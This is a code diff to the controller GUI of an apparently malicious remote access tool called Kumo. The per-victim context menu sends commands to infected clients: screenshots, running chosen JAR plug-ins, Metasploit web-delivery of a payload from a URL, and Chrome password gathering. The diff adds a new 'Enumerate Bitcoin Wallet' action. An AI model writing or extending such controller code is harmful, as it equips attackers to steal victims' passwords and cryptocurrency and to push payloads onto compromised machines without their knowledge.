@@ -8,6 +8,7 @@ import Logger.Logger;
 import Server.ClientObject;
 import Server.Data.PseudoBase;
 import Server.Data.Repository;
+import Server.KumoSettings;
 import javafx.scene.Scene;
 import javafx.scene.control.ContextMenu;
 import javafx.scene.control.Menu;
@@ -25,6 +26,7 @@ import java.io.*;
 
 class IPContextMenu implements Repository {
     static void getIPContextMenu(TableCell n, MouseEvent e) {
+        Logger.log(Level.INFO, "Felt right click on client, opening IP Context Menu");
         ClientObject clientObject = ((ClientObject) n.getTableView().getSelectionModel().getSelectedItem());
         ContextMenu cm = new ContextMenu();
         Menu mi1 = new Menu("Actions\t\t\u25B6");
@@ -76,7 +78,7 @@ class IPContextMenu implements Repository {
                         directoryChooser.showDialog(Kumo.getPrimaryStage());
                 FileContextMenu.selectedDirectory = selectedDirectory.getAbsolutePath();
                 try {
-                    clientObject.clientCommunicate("SCREENSHOT");
+                    clientObject.clientCommunicate("SCREENSHOT " + KumoSettings.MscreenshotType);
                 } catch (IOException e1) {
                     Logger.log(Level.ERROR, e1.toString(), e1);
                 }
@@ -166,7 +168,13 @@ class IPContextMenu implements Repository {
                 if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                     try {
                         String target = WebDeliveryView.getTargetsComboBox().getSelectionModel().getSelectedItem().toString().toLowerCase();
-                        clientObject.clientCommunicate("MSFWD " + target + " " + WebDeliveryView.getUrl().getText());
+                        String ogText = WebDeliveryView.getUrl().getText();
+                        String sanitized = "http://";
+
+                        if (!ogText.startsWith("http"))
+                            sanitized = sanitized + ogText;
+
+                        clientObject.clientCommunicate("MSFWD " + target + " " + sanitized);
                         stage.close();
                     } catch (IOException e1) {
                         e1.printStackTrace();
@@ -179,7 +187,7 @@ class IPContextMenu implements Repository {
         si8.setOnAction(event -> {
             // Get the jar the user wants to run
             FileChooser fileChooser = new FileChooser();
-            fileChooser.getExtensionFilters().add(new FileChooser.ExtensionFilter("Runnable JAR file", "*.jar"));
+            fileChooser.getExtensionFilters().add(new FileChooser.ExtensionFilter("Runnable JAR file | *.jar", "*.jar"));
             fileChooser.setTitle("Select plug-in");
             File selectedDirectory = fileChooser.showOpenDialog(Kumo.getPrimaryStage());
             String fileLocation = selectedDirectory.getAbsolutePath();
@@ -309,6 +317,28 @@ class IPContextMenu implements Repository {
         });
         pwdRecovery.getItems().addAll(gatherChrome);
 
+        ///////// ENUM
+        Menu enumerate = new Menu("Enumeration      \u25B6");
+        MenuItem enumBitcoin = new MenuItem("Enumerate Bitcoin Wallet");
+        enumBitcoin.setOnAction(event -> {
+            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
+                try {
+                    Stage stage = new Stage();
+                    stage.initStyle(StageStyle.UNDECORATED);
+                    stage.setMinHeight(100);
+                    stage.setMinWidth(200);
+                    stage.setScene(new Scene(new MiscTextView().getTextView(stage), 400, 200));
+                    clientObject.clientCommunicate("ENUM//BTC");
+                    stage.show();
+                } catch (IOException ioe){
+                    Logger.log(Level.ERROR, "Error in btc wallet enum: ", ioe);
+                }
+            }
+
+        });
+
+        enumerate.getItems().addAll(enumBitcoin);
+
         //////// MISC \\\\\\\\
         Menu misc = new Menu("Misc      \u25B6");
         MenuItem visit = new MenuItem("Visit Website");
@@ -421,7 +451,7 @@ class IPContextMenu implements Repository {
             }
         });
 
-        mi1.getItems().addAll(sb1, sb2, si4, si5, si6, si7, si10, si8, si9, clip, pwdRecovery, misc, update);
+        mi1.getItems().addAll(sb1, sb2, si4, si5, si6, si7, si10, si8, si9, clip, pwdRecovery, enumerate, misc, update);
 
         MenuItem mi2 = new MenuItem("Copy IP");
         mi2.setOnAction(event -> {
